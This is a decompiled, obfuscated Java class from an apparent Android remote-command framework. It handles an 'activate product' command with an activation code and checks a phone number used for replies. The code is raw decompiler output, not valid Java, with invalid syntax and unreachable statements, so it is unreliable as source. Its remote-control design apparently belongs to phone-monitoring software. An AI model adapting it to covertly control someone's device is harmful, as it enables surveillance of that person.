package com.vvt.remotecommand.processor.a;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.InvalidPhoneNumberException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.input.RmtCtrlInputActivation;
import com.vvt.remotecontrol.output.RmtCtrlActivateOutputStatusMessage;
import java.util.ArrayList;

public class b
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public b(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  private void a(RemoteCommand paramRemoteCommand)
  {
    int i = 2;
    int j = 1;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject = paramRemoteCommand.getParameters();
    boolean bool4 = paramRemoteCommand.isReplyMesageRequired();
    boolean bool6 = a;
    int n;
    if ((!bool6) || (bool4))
    {
      n = ((ArrayList)localObject).size();
      if (n == i)
      {
        localObject = (String)((ArrayList)localObject).get(j);
        a(paramRemoteCommand, (String)localObject);
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      int k = ((ArrayList)localObject).size();
      boolean bool2;
      if (k == j)
      {
        bool2 = a;
        if (!bool2) {}
      }
      else
      {
        localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
        ((InvalidCommanFormatException)localObject).<init>();
        throw ((Throwable)localObject);
        n = ((ArrayList)localObject).size();
        if (n == i)
        {
          boolean bool5 = a;
          if (bool5) {}
          localObject = (String)((ArrayList)localObject).get(j);
          a(paramRemoteCommand, (String)localObject);
          bool2 = false;
          localObject = null;
          paramRemoteCommand.setReplyMessageRequired(false);
        }
        else
        {
          int m = ((ArrayList)localObject).size();
          if (m != j) {
            break;
          }
          boolean bool3 = a;
          if (!bool3) {}
        }
      }
    }
    localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
    ((InvalidCommanFormatException)localObject).<init>();
    throw ((Throwable)localObject);
  }
  
  private void a(RemoteCommand paramRemoteCommand, String paramString)
  {
    boolean bool1 = com.vvt.ah.a.b(paramString);
    boolean bool2 = a;
    if ((!bool2) || (bool1))
    {
      paramRemoteCommand.setRecipient(paramString);
      return;
    }
    InvalidPhoneNumberException localInvalidPhoneNumberException = new com/vvt/remotecommand/exception/InvalidPhoneNumberException;
    localInvalidPhoneNumberException.<init>();
    throw localInvalidPhoneNumberException;
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramRemoteCommand.getParameters();
    a(paramRemoteCommand);
    boolean bool2 = false;
    localObject1 = (String)((ArrayList)localObject1).get(0);
    Object localObject2 = new com/vvt/remotecontrol/input/RmtCtrlInputActivation;
    ((RmtCtrlInputActivation)localObject2).<init>();
    ((RmtCtrlInputActivation)localObject2).setActivationCode((String)localObject1);
    localObject1 = new com/vvt/remotecontrol/ControlCommand;
    ((ControlCommand)localObject1).<init>();
    RemoteFunction localRemoteFunction = RemoteFunction.ACTIVATE_PRODUCT;
    ((ControlCommand)localObject1).setFunction(localRemoteFunction);
    ((ControlCommand)localObject1).setData(localObject2);
    localObject2 = h();
    localObject1 = (RmtCtrlActivateOutputStatusMessage)((com.vvt.remotecontrol.a)localObject2).execute((ControlCommand)localObject1);
    if (paramc != null)
    {
      bool2 = a;
      if (bool2) {}
      bool2 = ((RmtCtrlActivateOutputStatusMessage)localObject1).isSuccess();
      if (!bool2) {
        break label150;
      }
      localObject1 = "Activation success. Nice!";
      bool2 = a;
      if (bool2) {}
      paramc.b(paramRemoteCommand, this, (String)localObject1);
    }
    for (;;)
    {
      return;
      label150:
      bool2 = a;
      if (bool2) {}
      localObject2 = new com/vvt/remotecommand/exception/RemoteCommandException;
      localObject1 = ((RmtCtrlActivateOutputStatusMessage)localObject1).getMessage();
      ((RemoteCommandException)localObject2).<init>((String)localObject1);
      paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject2);
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "ProcActivateWithActivationCode";
  }
  
  public boolean f()
  {
    return false;
  }
  
  public long g()
  {
    return 60000L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */